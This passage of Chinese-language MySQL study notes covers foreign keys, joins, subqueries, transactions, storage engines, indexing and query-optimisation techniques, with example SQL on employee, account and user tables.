KEY (外键字段名) REFERENCES 主表(主表列名); -- 例子 alter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id); 删除外键： ALTER TABLE 表名 DROP FOREIGN KEY 外键名;\n删除/更新行为 行为 说明 NO ACTION 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新（与RESTRICT一致） RESTRICT 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新（与NO ACTION一致） CASCADE 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则也删除/更新外键在子表中的记录 SET NULL 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则设置子表中该外键值为null（要求该外键允许为null） SET DEFAULT 父表有变更时，子表将外键设为一个默认值（Innodb不支持） 更改删除/更新行为： ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;\n多表查询 多表关系 一对多（多对一） 多对多 一对一 一对多 案例：部门与员工 关系：一个部门对应多个员工，一个员工对应一个部门 实现：在多的一方建立外键，指向一的一方的主键\n多对多 案例：学生与课程 关系：一个学生可以选多门课程，一门课程也可以供多个学生选修 实现：建立第三张中间表，中间表至少包含两个外键，分别关联两方主键\n一对一 案例：用户与用户详情 关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率 实现：在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的（UNIQUE）\n查询 合并查询（笛卡尔积，会展示所有组合结果）： select * from employee, dept;\n笛卡尔积：两个集合A集合和B集合的所有组合情况（在多表查询时，需要消除无效的笛卡尔积）\n消除无效笛卡尔积： select * from employee, dept where employee.dept = dept.id;\n内连接查询 内连接查询的是两张表交集的部分\n隐式内连接： SELECT 字段列表 FROM 表1, 表2 WHERE 条件 ...;\n显式内连接： SELECT 字段列表 FROM 表1 [ INNER ] JOIN 表2 ON 连接条件 ...;\n显式性能比隐式高\n例子：\n1 2 3 4 5 -- 查询员工姓名，及关联的部门的名称 -- 隐式 select e.name, d.name from employee as e, dept as d where e.dept = d.id; -- 显式 select e.name, d.name from employee as e inner join dept as d on e.dept = d.id; 外连接查询 左外连接： 查询左表所有数据，以及两张表交集部分数据 SELECT 字段列表 FROM 表1 LEFT [ OUTER ] JOIN 表2 ON 条件 ...; 相当于查询表1的所有数据，包含表1和表2交集部分数据\n右外连接： 查询右表所有数据，以及两张表交集部分数据 SELECT 字段列表 FROM 表1 RIGHT [ OUTER ] JOIN 表2 ON 条件 ...;\n例子：\n1 2 3 4 5 -- 左 select e.*, d.name from employee as e left outer join dept as d on e.dept = d.id; select d.name, e.* from dept d left outer join emp e on e.dept = d.id; -- 这条语句与下面的语句效果一样 -- 右 select d.name, e.* from employee as e right outer join dept as d on e.dept = d.id; 左连接可以查询到没有dept的employee，右连接可以查询到没有employee的dept\n自连接查询 当前表与自身的连接查询，自连接必须使用表别名\n语法： SELECT 字段列表 FROM 表A 别名A JOIN 表A 别名B ON 条件 ...;\n自连接查询，可以是内连接查询，也可以是外连接查询\n例子：\n1 2 3 4 -- 查询员工及其所属领导的名字 select a.name, b.name from employee a, employee b where a.manager = b.id; -- 没有领导的也查询出来 select a.name, b.name from employee a left join employee b on a.manager = b.id; 联合查询 union, union all 把多次查询的结果合并，形成一个新的查询集\n语法：\n1 2 3 SELECT 字段列表 FROM 表A ... UNION [ALL] SELECT 字段列表 FROM 表B ... 注意事项 UNION ALL 会有重复结果，UNION 不会 联合查询比使用or效率高，不会使索引失效 子查询 SQL语句中嵌套SELECT语句，称谓嵌套查询，又称子查询。 SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2); 子查询外部的语句可以是 INSERT / UPDATE / DELETE / SELECT 的任何一个\n根据子查询结果可以分为：\n标量子查询（子查询结果为单个值） 列子查询（子查询结果为一列） 行子查询（子查询结果为一行） 表子查询（子查询结果为多行多列） 根据子查询位置可分为：\nWHERE 之后 FROM 之后 SELECT 之后 标量子查询 子查询返回的结果是单个值（数字、字符串、日期等）。 常用操作符：- \u0026lt; \u0026gt; \u0026gt; \u0026gt;= \u0026lt; \u0026lt;=\n例子：\n1 2 3 4 5 6 7 8 9 -- 查询销售部所有员工 select id from dept where name = \u0026#39;销售部\u0026#39;; -- 根据销售部部门ID，查询员工信息 select * from employee where dept = 4; -- 合并（子查询） select * from employee where dept = (select id from dept where name = \u0026#39;销售部\u0026#39;); -- 查询xxx入职之后的员工信息 select * from employee where entrydate \u0026gt; (select entrydate from employee where name = \u0026#39;xxx\u0026#39;);my 列子查询 返回的结果是一列（可以是多行）。\n常用操作符：\n操作符 描述 IN 在指定的集合范围内，多选一 NOT IN 不在指定的集合范围内 ANY 子查询返回列表中，有任意一个满足即可 SOME 与ANY等同，使用SOME的地方都可以使用ANY ALL 子查询返回列表的所有值都必须满足 例子：\n1 2 3 4 5 6 -- 查询销售部和市场部的所有员工信息 select * from employee where dept in (select id from dept where name = \u0026#39;销售部\u0026#39; or name = \u0026#39;市场部\u0026#39;); -- 查询比财务部所有人工资都高的员工信息 select * from employee where salary \u0026gt; all(select salary from employee where dept = (select id from dept where name = \u0026#39;财务部\u0026#39;)); -- 查询比研发部任意一人工资高的员工信息 select * from employee where salary \u0026gt; any (select salary from employee where dept = (select id from dept where name = \u0026#39;研发部\u0026#39;)); 行子查询 返回的结果是一行（可以是多列）。 常用操作符：=, \u0026lt;, \u0026gt;, IN, NOT IN\n例子：\n1 2 3 -- 查询与xxx的薪资及直属领导相同的员工信息 select * from employee where (salary, manager) = (12500, 1); select * from employee where (salary, manager) = (select salary, manager from employee where name = \u0026#39;xxx\u0026#39;); 表子查询 返回的结果是多行多列 常用操作符：IN\n例子：\n1 2 3 4 -- 查询与xxx1，xxx2的职位和薪资相同的员工 select * from employee where (job, salary) in (select job, salary from employee where name = \u0026#39;xxx1\u0026#39; or name = \u0026#39;xxx2\u0026#39;); -- 查询入职日期是2006-01-01之后的员工，及其部门信息 select e.*, d.* from (select * from employee where entrydate \u0026gt; \u0026#39;2006-01-01\u0026#39;) as e left join dept as d on e.dept = d.id; 总结： 事务 事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。\n基本操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- 1. 查询张三账户余额 select * from account where name = \u0026#39;张三\u0026#39;; -- 2. 将张三账户余额-1000 update account set money = money - 1000 where name = \u0026#39;张三\u0026#39;; -- 此语句出错后张三钱减少但是李四钱没有增加 模拟sql语句错误 -- 3. 将李四账户余额+1000 update account set money = money + 1000 where name = \u0026#39;李四\u0026#39;; -- 查看事务提交方式 SELECT @@AUTOCOMMIT; -- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效 SET @@AUTOCOMMIT = 0; -- 提交事务 COMMIT; -- 回滚事务 ROLLBACK; -- 设置手动提交后上面代码改为： select * from account where name = \u0026#39;张三\u0026#39;; update account set money = money - 1000 where name = \u0026#39;张三\u0026#39;; update account set money = money + 1000 where name = \u0026#39;李四\u0026#39;; commit; 操作方式二：\n开启事务： START TRANSACTION 或 BEGIN TRANSACTION; 提交事务： COMMIT; 回滚事务： ROLLBACK;\n操作实例：\n1 2 3 4 5 start transaction; select * from account where name = \u0026#39;张三\u0026#39;; update account set money = money - 1000 where name = \u0026#39;张三\u0026#39;; update account set money = money + 1000 where name = \u0026#39;李四\u0026#39;; commit; 四大特性ACID 原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败 一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态 隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行 持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的 并发事务 问题 描述 脏读 一个事务读到另一个事务还没提交的数据 不可重复读 一个事务先后读取同一条记录，但两次读取的数据不同 幻读 一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在 这三个问题的详细演示：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd\n并发事务隔离级别：\n隔离级别 脏读 不可重复读 幻读 Read uncommitted √ √ √ Read committed × √ √ Repeatable Read(默认) × × √ Serializable × × × √表示在当前隔离级别下该问题会出现 Serializable 性能最低；Read uncommitted 性能最高，数据安全性最差 查看事务隔离级别： SELECT @@TRANSACTION_ISOLATION; 设置事务隔离级别： SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE }; SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效\n进阶篇 存储引擎 MySQL体系结构：\n存储引擎就是存储数据、建立索引、更新/查询数据等技术的实现方式。存储引擎是基于表而不是基于库的，所以存储引擎也可以被称为表引擎。 默认存储引擎是InnoDB。\n相关操作：\n1 2 3 4 5 6 7 8 -- 查询建表语句 show create table account; -- 建表时指定存储引擎 CREATE TABLE 表名( ... ) ENGINE=INNODB; -- 查看当前数据库支持的存储引擎 show engines; InnoDB InnoDB 是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB 是默认的 MySQL 引擎。\n特点：\nDML 操作遵循 ACID 模型，支持事务 行级锁，提高并发访问性能 支持外键约束，保证数据的完整性和正确性 文件：\nxxx.ibd: xxx代表表名，InnoDB 引擎的每张表都会对应这样一个表空间文件，存储该表的表结构（frm、sdi）、数据和索引。 参数：innodb_file_per_table，决定多张表共享一个表空间还是每张表对应一个表空间\n知识点：\n查看 Mysql 变量： show variables like 'innodb_file_per_table';\n从idb文件提取表结构数据： （在cmd运行） ibd2sdi xxx.ibd\nInnoDB 逻辑存储结构： MyISAM MyISAM 是 MySQL 早期的默认存储引擎。\n特点：\n不支持事务，不支持外键 支持表锁，不支持行锁 访问速度快 文件：\nxxx.sdi: 存储表结构信息 xxx.MYD: 存储数据 xxx.MYI: 存储索引 Memory Memory 引擎的表数据是存储在内存中的，受硬件问题、断电问题的影响，只能将这些表作为临时表或缓存使用。\n特点：\n存放在内存中，速度快 hash索引（默认） 文件：\nxxx.sdi: 存储表结构信息 存储引擎特点 特点 InnoDB MyISAM Memory 存储限制 64TB 有 有 事务安全 支持 - - 锁机制 行锁 表锁 表锁 B+tree索引 支持 支持 支持 Hash索引 - - 支持 全文索引 支持（5.6版本之后） 支持 - 空间使用 高 低 N/A 内存使用 高 低 中等 批量插入速度 低 高 高 支持外键 支持 - - 存储引擎的选择 在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。对于复杂的应用系统，还可以根据实际情况选择多种存储引擎进行组合。\nInnoDB: 如果应用对事物的完整性有比较高的要求，在并发条件下要求数据的一致性，数据操作除了插入和查询之外，还包含很多的更新、删除操作，则 InnoDB 是比较合适的选择 MyISAM: 如果应用是以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性、并发性要求不高，那这个存储引擎是非常合适的。 Memory: 将所有数据保存在内存中，访问速度快，通常用于临时表及缓存。Memory 的缺陷是对表的大小有限制，太大的表无法缓存在内存中，而且无法保障数据的安全性 电商中的足迹和评论适合使用 MyISAM 引擎，缓存适合使用 Memory 引擎。\n性能分析 查看执行频次 查看当前数据库的 INSERT, UPDATE, DELETE, SELECT 访问频次： SHOW GLOBAL STATUS LIKE 'Com_______'; 或者 SHOW SESSION STATUS LIKE 'Com_______'; 例：show global status like 'Com_______'\n慢查询日志 慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。 MySQL的慢查询日志默认没有开启，需要在MySQL的配置文件（/etc/my.cnf）中配置如下信息： # 开启慢查询日志开关 slow_query_log=1 # 设置慢查询日志的时间为2秒，SQL语句执行时间超过2秒，就会视为慢查询，记录慢查询日志 long_query_time=2 更改后记得重启MySQL服务，日志文件位置：/var/lib/mysql/localhost-slow.log\n查看慢查询日志开关状态： show variables like 'slow_query_log';\nprofile show profile 能在做SQL优化时帮我们了解时间都耗费在哪里。通过 have_profiling 参数，能看到当前 MySQL 是否支持 profile 操作： SELECT @@have_profiling; profiling 默认关闭，可以通过set语句在session/global级别开启 profiling： SET profiling = 1; 查看所有语句的耗时： show profiles; 查看指定query_id的SQL语句各个阶段的耗时： show profile for query query_id; 查看指定query_id的SQL语句CPU的使用情况 show profile cpu for query query_id;\nexplain EXPLAIN 或者 DESC 命令获取 MySQL 如何执行 SELECT 语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。 语法： # 直接在select语句之前加上关键字 explain / desc EXPLAIN SELECT 字段列表 FROM 表名 HWERE 条件;\nEXPLAIN 各字段含义：\nid：select 查询的序列号，表示查询中执行 select 子句或者操作表的顺序（id相同，执行顺序从上到下；id不同，值越大越先执行） select_type：表示 SELECT 的类型，常见取值有 SIMPLE（简单表，即不适用表连接或者子查询）、PRIMARY（主查询，即外层的查询）、UNION（UNION中的第二个或者后面的查询语句）、SUBQUERY（SELECT/WHERE之后包含了子查询）等 type：表示连接类型，性能由好到差的连接类型为 NULL、system、const、eq_ref、ref、range、index、all possible_key：可能应用在这张表上的索引，一个或多个 Key：实际使用的索引，如果为 NULL，则没有使用索引 Key_len：表示索引中使用的字节数，该值为索引字段最大可能长度，并非实际使用长度，在不损失精确性的前提下，长度越短越好 rows：MySQL认为必须要执行的行数，在InnoDB引擎的表中，是一个估计值，可能并不总是准确的 filtered：表示返回结果的行数占需读取行数的百分比，filtered的值越大越好 索引 索引是帮助 MySQL 高效获取数据的数据结构（有序）。在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构上实现高级查询算法，这种数据结构就是索引。\n优缺点：\n优点：\n提高数据检索效率，降低数据库的IO成本 通过索引列对数据进行排序，降低数据排序的成本，降低CPU的消耗 缺点：\n索引列也是要占用空间的 索引大大提高了查询效率，但降低了更新的速度，比如 INSERT、UPDATE、DELETE 索引结构 索引结构 描述 B+Tree 最常见的索引类型，大部分引擎都支持B+树索引 Hash 底层数据结构是用哈希表实现，只有精确匹配索引列的查询才有效，不支持范围查询 R-Tree(空间索引) 空间索引是 MyISAM 引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少 Full-Text(全文索引) 是一种通过建立倒排索引，快速匹配文档的方式，类似于 Lucene, Solr, ES 索引 InnoDB MyISAM Memory B+Tree索引 支持 支持 支持 Hash索引 不支持 不支持 支持 R-Tree索引 不支持 支持 不支持 Full-text 5.6版本后支持 支持 不支持 B-Tree 二叉树的缺点可以用红黑树来解决： 红黑树也存在大数据量情况下，层级较深，检索速度慢的问题。\n为了解决上述问题，可以使用 B-Tree 结构。 B-Tree (多路平衡查找树) 以一棵最大度数（max-degree，指一个节点的子节点个数）为5（5阶）的 b-tree 为例（每个节点最多存储4个key，5个指针）\nB-Tree 的数据插入过程动画参照：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=68 演示地址：https://www.cs.usfca.edu/~galles/visualization/BTree.html\nB+Tree 结构图：\n演示地址：https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html\n与 B-Tree 的区别：\n所有的数据都会出现在叶子节点 叶子节点形成一个单向链表 MySQL 索引数据结构对经典的 B+Tree 进行了优化。在原 B+Tree 的基础上，增加一个指向相邻叶子节点的链表指针，就形成了带有顺序指针的 B+Tree，提高区间访问的性能。\nHash 哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。 如果两个（或多个）键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。\n特点：\nHash索引只能用于对等比较（=、in），不支持范围查询（betwwn、\u0026gt;、\u0026lt;、\u0026hellip;） 无法利用索引完成排序操作 查询效率高，通常只需要一次检索就可以了，效率通常要高于 B+Tree 索引 存储引擎支持：\nMemory InnoDB: 具有自适应hash功能，hash索引是存储引擎根据 B+Tree 索引在指定条件下自动构建的 面试题 为什么 InnoDB 存储引擎选择使用 B+Tree 索引结构？ 相对于二叉树，层级更少，搜索效率高 对于 B-Tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针也跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低 相对于 Hash 索引，B+Tree 支持范围匹配及排序操作 索引分类 分类 含义 特点 关键字 主键索引 针对于表中主键创建的索引 默认自动创建，只能有一个 PRIMARY 唯一索引 避免同一个表中某数据列中的值重复 可以有多个 UNIQUE 常规索引 快速定位特定数据 可以有多个 全文索引 全文索引查找的是文本中的关键词，而不是比较索引中的值 可以有多个 FULLTEXT 在 InnoDB 存储引擎中，根据索引的存储形式，又可以分为以下两种：\n分类 含义 特点 聚集索引(Clustered Index) 将数据存储与索引放一块，索引结构的叶子节点保存了行数据 必须有，而且只有一个 二级索引(Secondary Index) 将数据与索引分开存储，索引结构的叶子节点关联的是对应的主键 可以存在多个 演示图：\n聚集索引选取规则：\n如果存在主键，主键索引就是聚集索引 如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引 如果表没有主键或没有合适的唯一索引，则 InnoDB 会自动生成一个 rowid 作为隐藏的聚集索引 思考题 1. 以下 SQL 语句，哪个执行效率高？为什么？\n1 2 3 select * from user where id = 10; select * from user where name = \u0026#39;Arm\u0026#39;; -- 备注：id为主键，name字段创建的有索引 答：第一条语句，因为第二条需要回表查询，相当于两个步骤。\n2. InnoDB 主键索引的 B+Tree 高度为多少？\n答：假设一行数据大小为1k，一页中可以存储16行这样的数据。InnoDB 的指针占用6个字节的空间，主键假设为bigint，占用字节数为8. 可得公式：n * 8 + (n + 1) * 6 = 16 * 1024，其中 8 表示 bigint 占用的字节数，n 表示当前节点存储的key的数量，(n + 1) 表示指针数量（比key多一个）。算出n约为1170。\n如果树的高度为2，那么他能存储的数据量大概为：1171 * 16 = 18736； 如果树的高度为3，那么他能存储的数据量大概为：1171 * 1171 * 16 = 21939856。\n另外，如果有成千上万的数据，那么就要考虑分表，涉及运维篇知识。\n语法 创建索引： CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name (index_col_name, ...); 如果不加 CREATE 后面不加索引类型参数，则创建的是常规索引\n查看索引： SHOW INDEX FROM table_name;\n删除索引： DROP INDEX index_name ON table_name;\n案例：\n1 2 3 4 5 6 7 8 9 10 11 -- name字段为姓名字段，该字段的值可能会重复，为该字段创建索引 create index idx_user_name on tb_user(name); -- phone手机号字段的值非空，且唯一，为该字段创建唯一索引 create unique index idx_user_phone on tb_user (phone); -- 为profession, age, status创建联合索引 create index idx_user_pro_age_stat on tb_user(profession, age, status); -- 为email建立合适的索引来提升查询效率 create index idx_user_email on tb_user(email); -- 删除索引 drop index idx_user_email on tb_user; 使用规则 最左前缀法则 如果索引关联了多列（联合索引），要遵守最左前缀法则，最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。 如果跳跃某一列，索引将部分失效（后面的字段索引失效）。\n联合索引中，出现范围查询（\u0026lt;, \u0026gt;），范围查询右侧的列索引失效。可以用\u0026gt;=或者\u0026lt;=来规避索引失效问题。\n索引失效情况 在索引列上进行运算操作，索引将失效。如：explain select * from tb_user where substring(phone, 10, 2) = '15'; 字符串类型字段使用时，不加引号，索引将失效。如：explain select * from tb_user where phone = 17799990015;，此处phone的值没有加引号 模糊查询中，如果仅仅是尾部模糊匹配，索引不会是失效；如果是头部模糊匹配，索引失效。如：explain select * from tb_user where profession like '%工程';，前后都有 % 也会失效。 用 or 分割开的条件，如果 or 其中一个条件的列没有索引，那么涉及的索引都不会被用到。 如果 MySQL 评估使用索引比全表更慢，则不使用索引。 SQL 提示 是优化数据库的一个重要手段，简单来说，就是在SQL语句中加入一些人为的提示来达到优化操作的目的。\n例如，使用索引： explain select * from tb_user use index(idx_user_pro) where profession=\u0026quot;软件工程\u0026quot;; 不使用哪个索引： explain select * from tb_user ignore index(idx_user_pro) where profession=\u0026quot;软件工程\u0026quot;; 必须使用哪个索引： explain select * from tb_user force index(idx_user_pro) where profession=\u0026quot;软件工程\u0026quot;;\nuse 是建议，实际使用哪个索引 MySQL 还会自己权衡运行速度去更改，force就是无论如何都强制使用该索引。\n覆盖索引\u0026amp;回表查询 尽量使用覆盖索引（查询使用了索引，并且需要返回的列，在该索引中已经全部能找到），减少 select *。\nexplain 中 extra 字段含义： using index condition：查找使用了索引，但是需要回表查询数据 using where; using index;：查找使用了索引，但是需要的数据都在索引列中能找到，所以不需要回表查询\n如果在聚集索引中直接能找到对应的行，则直接返回行数据，只需要一次查询，哪怕是select *；如果在辅助索引中找聚集索引，如select id, name from xxx where name='xxx';，也只需要通过辅助索引(name)查找到对应的id，返回name和name索引对应的id即可，只需要一次查询；如果是通过辅助索引查找其他字段，则需要回表查询，如select id, name, gender from xxx where name='xxx';\n所以尽量不要用select *，容易出现回表查询，降低效率，除非有联合索引包含了所有字段\n面试题：一张表，有四个字段（id, username, password, status），由于数据量大，需要对以下SQL语句进行优化，该如何进行才是最优方案： select id, username, password from tb_user where username='itcast';\n解：给username和password字段建立联合索引，则不需要回表查询，直接覆盖索引\n前缀索引 当字段类型为字符串（varchar, text等）时，有时候需要索引很长的字符串，这会让索引变得很大，查询时，浪费大量的磁盘IO，影响查询效率，此时可以只降字符串的一部分前缀，建立索引，这样可以大大节约索引空间，从而提高索引效率。\n语法：create index idx_xxxx on table_name(columnn(n)); 前缀长度：可以根据索引的选择性来决定，而选择性是指不重复的索引值（基数）和数据表的记录总数的比值，索引选择性越高则查询效率越高，唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。 求选择性公式：\n1 2 select count(distinct email) / count(*) from tb_user; select count(distinct substring(email, 1, 5)) / count(*) from tb_user; show index 里面的sub_part可以看到接取的长度\n单列索引\u0026amp;联合索引 单列索引：即一个索引只包含单个列 联合索引：即一个索引包含了多个列 在业务场景中，如果存在多个查询条件，考虑针对于查询字段建立索引时，建议建立联合索引，而非单列索引。\n单列索引情况： explain select id, phone, name from tb_user where phone = '17799990010' and name = '韩信'; 这句只会用到phone索引字段\n注意事项 多条件联合查询时，MySQL优化器会评估哪个字段的索引效率更高，会选择该索引完成本次查询 设计原则 针对于数据量较大，且查询比较频繁的表建立索引 针对于常作为查询条件（where）、排序（order by）、分组（group by）操作的字段建立索引 尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高 如果是字符串类型的字段，字段长度较长，可以针对于字段的特点，建立前缀索引 尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率 要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价就越大，会影响增删改的效率 如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询 SQL 优化 插入数据 普通插入：\n采用批量插入（一次插入的数据不建议超过1000条） 手动提交事务 主键顺序插入 大批量插入： 如果一次性需要插入大批量数据，使用insert语句插入性能较低，此时可以使用MySQL数据库提供的load指令插入。\n1 2 3 4 5 6 7 # 客户端连接服务端时，加上参数 --local-infile（这一行在bash/cmd界面输入） mysql --local-infile -u root -p # 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关 set global local_infile = 1; select @@local_infile; # 执行load指令将准备好的数据，加载到表结构中 load data local infile \u0026#39;/root/sql1.log\u0026#39; into table \u0026#39;tb_user\u0026#39; fields terminated by \u0026#39;,\u0026#39; lines terminated by \u0026#39;\\n\u0026#39;; 主键优化 数据组织方式：在InnoDB存储引擎中，表数据都是根据主键顺序组织存放的，这种存储方式的表称为索引组织表（Index organized table, IOT）\n页分裂：页可以为空，也可以填充一般，也可以填充100%，每个页包含了2-N行数据（如果一行数据过大，会行溢出），根据主键排列。 页合并：当删除一行记录时，实际上记录并没有被物理删除，只是记录被标记（flaged）为删除并且它的空间变得允许被其他记录声明使用。当页中删除的记录到达 MERGE_THRESHOLD（默认为页的50%），InnoDB会开始寻找最靠近的页（前后）看看是否可以将这两个页合并以优化空间使用。\nMERGE_THRESHOLD：合并页的阈值，可以自己设置，在创建表或创建索引时指定\n文字说明不够清晰明了，具体可以看视频里的PPT演示过程：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=90\n主键设计原则：\n满足业务需求的情况下，尽量降低主键的长度 插入数据时，尽量选择顺序插入，选择使用 AUTO_INCREMENT 自增主键 尽量不要使用 UUID 做主键或者是其他的自然主键，如身份证号 业务操作时，避免对主键的修改 order by优化 Using filesort：通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区 sort buffer 中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序 Using index：通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高 如果order by字段全部使用升序排序或者降序排序，则都会走索引，但是如果一个字段升序排序，另一个字段降序排序，则不会走索引，explain的extra信息显示的是Using index, Using filesort，如果要优化掉Using filesort，则需要另外再创建一个索引，如：create index idx_user_age_phone_ad on tb_user(age asc, phone desc);，此时使用select id, age, phone from tb_user order by age asc, phone desc;会全部走索引\n总结：\n根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则 尽量使用覆盖索引 多字段排序，一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC/DESC） 如果不可避免出现filesort，大数据量排序时，可以适当增大排序缓冲区大小 sort_buffer_size（默认256k） group by优化 在分组操作时，可以通过索引来提高效率 分组操作时，索引的使用也是满足最左前缀法则的 如索引为idx_user_pro_age_stat，则句式可以是select ... where profession order by age，这样也符合最左前缀法则\nlimit优化 常见的问题如limit 2000000, 10，此时需要 MySQL 排序前2000000条记录，但仅仅返回2000000 - 2000010的记录，其他记录丢弃，查询排序的代价非常大。 优化方案：一般分页查询时，通过创建覆盖索引能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化\n例如：\n1 2 3 4 5 6 7 8 -- 此语句耗时很长 select * from tb_sku limit 9000000, 10; -- 通过覆盖索引加快速度，直接通过主键索引进行排序及查询 select id from tb_sku order by id limit 9000000, 10; -- 下面的语句是错误的，因为 MySQL 不支持 in 里面使用 limit -- select * from tb_sku where id in (select id from tb_sku order by id limit 9000000, 10); -- 通过连表查询即可实现第一句的效果，并且能达到第二句的速度 select * from tb_sku as s, (select id from tb_sku order by id limit 9000000, 10) as a where s.id = a.id; count优化 MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高（前提是不适用where）； InnoDB 在执行 count(*) 时，需要把数据一行一行地从引擎里面读出来，然后累计计数。 优化方案：自己计数，如创建key-value表存储在内存或硬盘，或者是用redis\ncount的几种用法：\n如果count函数的参数（count里面写的那个字段）不是NULL（字段值不为NULL），累计值就加一，最后返回累计值 用法：count(*)、count(主键)、count(字段)、count(1) count(主键)跟count(*)一样，因为主键不能为空；count(字段)只计算字段值不为NULL的行；count(1)引擎会为每行添加一个1，然后就count这个1，返回结果也跟count(*)一样；count(null)返回0 各种用法的性能：\ncount(主键)：InnoDB引擎会遍历整张表，把每行的主键id值都取出来，返回给服务层，服务层拿到主键后，直接按行进行累加（主键不可能为空） count(字段)：没有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加；有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加 count(1)：InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一层，放一个数字 1 进去，直接按行进行累加 count(*)：InnoDB 引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行进行累加 按效率排序：count(字段) \u0026lt; count(主键) \u0026lt; count(1) \u0026lt; count(*)，所以尽量使用 count(*)\nupdate优化（避免行锁升级为表锁） InnoDB 的行锁是针对索引加的锁，不是针对记录加的锁，并且该索引不能失效，否则会从行锁升级为表锁。\n如以下两条语句： update student set no = '123' where id = 1;，这句由于id有主键索引，所以只会锁这一行； update student set no = '123' where name = 'test';，这句由于name没有索引，所以会把整张表都锁住进行数据更新，解决方法是给name字段添加索引\n数据类型 整型 类型名称 取值范围 大小 TINYINT -128〜127 1个字节 SMALLINT -32768〜32767 2个宇节 MEDIUMINT -8388608〜8388607 3个字节 INT (INTEGHR) -2147483648〜2147483647 4个字节 BIGINT -9223372036854775808〜9223372036854775807 8个字节 无符号在数据类型后加 unsigned 关键字。\n浮点型 类型名称 说明 存储需求 FLOAT 单精度浮点数 4 个字节 DOUBLE 双精度浮点数 8 个字节 DECIMAL (M, D)，DEC 压缩的“严格”定点数 M+2 个字节 日期和时间 类型名称 日期格式 日期范围 存储需求 YEAR YYYY 1901 ~ 2155 1 个字节 TIME HH:MM:SS -838:59:59 ~ 838:59:59 3 个字节 DATE YYYY-MM-DD 1000-01-01 ~ 9999-12-3 3 个字节 DATETIME YYYY-MM-DD HH:MM:SS 1000-01-01 00:00:00 ~ 9999-12-31 23:59:59 8 个字节 TIMESTAMP YYYY-MM-DD HH:MM:SS 1980-01-01 00:00:01 UTC ~ 2040-01-19 03:14:07 UTC 4 个字节 字符串 类型名称 说明 存储需求 CHAR(M) 固定长度非二进制字符串 M 字节，1\u0026lt;=M\u0026lt;=255 VARCHAR(M) 变长非二进制字符串 L+1字节，在此，L\u0026lt; = M和 1\u0026lt;=M\u0026lt;=255 TINYTEXT 非常小的非二进制字符串 L+1字节，在此，L\u0026lt;2^8 TEXT 小的非二进制字符串 L+2字节，在此，L\u0026lt;2^16 MEDIUMTEXT 中等大小的非二进制字符串 L+3字节，在此，L\u0026lt;2^24 LONGTEXT 大的非二进制字符串 L+4字节，在此，L\u0026lt;2^32 ENUM 枚举类型，只能有一个枚举字符串值 1或2个字节，取决于枚举值的数目 